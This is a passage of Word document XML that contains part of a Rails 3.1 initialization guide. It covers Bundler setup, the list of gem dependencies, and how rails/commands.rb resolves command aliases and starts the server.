      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which declares all dependencies of the application. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/boot.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sets </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ENV["BUNDLE_GEMFILE"]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the location of this file, then requires Bundler and calls </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Bundler.setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which adds the dependencies of the application (including all the Rails parts) to the load path, making them available for the application to load. The gems that a Rails 3.1 application depends on are as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA780CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>abstract (1.0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3704CD01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>actionmailer (3.1.0.beta)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E39705C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>actionpack (3.1.0.beta)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9860D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>activemodel (3.1.0.beta)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC74B9A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>activerecord (3.1.0.beta)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AC41B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>activesupport (3.1.0.beta)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F60E89C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>arel (2.0.7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C88330" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>builder (3.0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5D8C19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>bundler (1.0.6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D475BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>erubis (2.6.6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B5F1FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>i18n (0.5.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291122F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>mail (2.2.12)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11775671" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>mime-types (1.16)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3BF86E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>polyglot (0.3.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B66375" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>rack (1.2.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451274FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>rack-cache (0.5.3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701F06EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>rack-mount (0.6.13)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71594C9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>rack-test (0.5.6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DD554B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>rails (3.1.0.beta)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1DD685" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>railties (3.1.0.beta)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BB6F9B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>rake (0.8.7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB54521" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>sqlite3-ruby (1.3.2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3429E931" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>thor (0.14.6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E3CD59" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>treetop (1.4.9)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C49B34A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="357"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>tzinfo (0.3.23)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226FDD33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/commands.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3885B3A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/boot.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has finished, the next file that is required is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/commands</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which will execute a command based on the arguments passed in. In this case, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ARGV</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> array simply contains </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is extracted into the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>command</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> variable using these lines:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0A2EF930" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C4A34D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>aliases = {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45D9B26F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "g"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "generate",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B9F2B42" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "c"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "console",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="344B6223" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "s"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "server",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B00A66A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "db"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "dbconsole",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72FD1835" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "r"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "runner"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72969213" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="156EE79A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AB7CCCB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>command = ARGV.shift</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58387D62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>command = aliases[command] || command</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="471A5F15" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If we used </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> rather than </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, Rails will use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>aliases</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defined in the file and match them to their respective commands. With the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command, Rails will run this code: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A203E8B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="59BE8EC1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>when</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'server'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E77720D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # Change to the application's path if there is no config.ru file in current dir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="475F6B29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # This allows us to run script/rails server from other directories, but still get</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329EE946" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # the main config.ru and properly set the tmp directory.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1567F30E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Dir.chdir(File.expand_path('../../', APP_PATH)) unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>File.exists?(File.expand_path("config.ru"))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FE424A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E5EAF7F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  require 'rails/commands/server'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="117F8803" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Rails::Server.new.tap { |server|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64918BB7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # We need to require application after the server sets environment,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EA9E743" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # otherwise the --environment option given to the server won't propagate.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1719D1E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    require APP_PATH</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="549564BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    Dir.chdir(Rails.application.root)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0246120F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    server.start</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="552F7ECC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="620C0A39" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file will change into the root of the directory (a path two directories back from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>APP_PATH</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which points at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">), but only if the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.ru</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file isn’t found. This then requires </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/commands/server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which requires </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and sets up the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F12199" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>actionpack/lib/action_dispatch.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A2ABD7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Action Dispatch is the routing component of the Rails framework. It depends on Active Support, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>actionpack/lib/action_pack.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> being available. The first thing required here is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
